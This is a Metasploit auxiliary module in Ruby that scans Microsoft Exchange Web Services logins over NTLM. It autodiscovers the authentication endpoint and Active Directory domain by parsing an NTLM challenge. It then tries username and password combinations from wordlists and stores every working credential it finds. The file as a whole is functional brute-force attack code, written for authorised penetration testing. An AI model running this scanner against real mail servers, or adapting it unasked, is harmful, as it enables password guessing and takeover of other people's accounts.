##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/ntlm/message'
require 'rex/proto/http'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'OWA Exchange Web Services (EWS) Login Scanner',
      'Description'    => %q{
        This module attempts to log in to the Exchange Web Services, often
        exposed at https://example.com/ews/, using NTLM authentication. This
        method is faster and simpler than traditional form-based logins.

        In most cases, all you need to set is RHOSTS and some combination of
        user/pass files; the autodiscovery should find the location of the NTLM
        authentication point as well as the AD domain, and use them accordingly.
      },
      'Author'         => 'Rich Whitcroft',
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => true, 'VERBOSE' => false }
    )

    register_options(
      [
        OptBool.new('AUTODISCOVER', [ false, "Automatically discover domain URI", true ]),
        OptString.new('AD_DOMAIN', [ false, "The Active Directory domain name", nil ]),
        OptString.new('TARGETURI', [ false, "The location of the NTLM service", nil ]),
        Opt::RPORT(443)
      ])
  end

  def run_host(ip)
    cli = Rex::Proto::Http::Client.new(datastore['RHOSTS'], datastore['RPORT'], {}, datastore['SSL'], datastore['SSLVersion'], nil, '', '')
    cli.set_config({ 'preferred_auth' => 'NTLM' })
    cli.connect

    domain = nil
    uri = nil

    if datastore['AUTODISCOVER']
      domain, uri = autodiscover(cli)
      if domain && uri
        print_good("Found NTLM service at #{uri} for domain #{domain}.")
      else
        print_error("Failed to autodiscover - try manually")
        return
      end
    elsif datastore['AD_DOMAIN'] && datastore['TARGETURI']
      domain = datastore['AD_DOMAIN']
      uri = datastore['TARGETURI']
      uri << "/" unless uri.chars.last == "/"
    else
      print_error("You must set AD_DOMAIN and TARGETURI if not using autodiscover.")
      return
    end

    cli.set_config({ 'domain' => domain })

    creds = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    creds.each do |cred|
      begin
        req = cli.request_raw({
          'uri' => uri,
          'method' => 'GET',
          'username' => cred.public,
          'password' => cred.private
        })

        res = cli.send_recv(req)
      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
        print_error("Connection failed")
        next
      end

      if res.code != 401
        print_brute :level => :good, :ip => ip, :msg => "Successful login: #{cred.to_s}"
        report_cred(
          ip: ip,
          port: datastore['RPORT'],
          service_name: 'owa_ews',
          user: cred.public,
          password: cred.private
        )

        return if datastore['STOP_ON_SUCCESS']
      else
        vprint_brute :level => :verror, :ip => ip, :msg => "Failed login: #{cred.to_s}"
      end
    end
  end

  def autodiscover(cli)
    uris = %w[ /ews/ /rpc/ /public/ ]
    uris.each do |uri|
      begin
        req = cli.request_raw({
          'encode'   => true,
          'uri'      => uri,
          'method'   => 'GET',
          'headers'  =>  {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}
        })

        res = cli.send_recv(req)
      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
        print_error("HTTP Connection Failed")
        next
      end

      unless res
        print_error("HTTP Connection Timeout")
        next
      end

      if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)
        hash = res['WWW-Authenticate'].split('NTLM ')[1]
        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
        return domain, uri
      end
    end

    return nil, nil
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
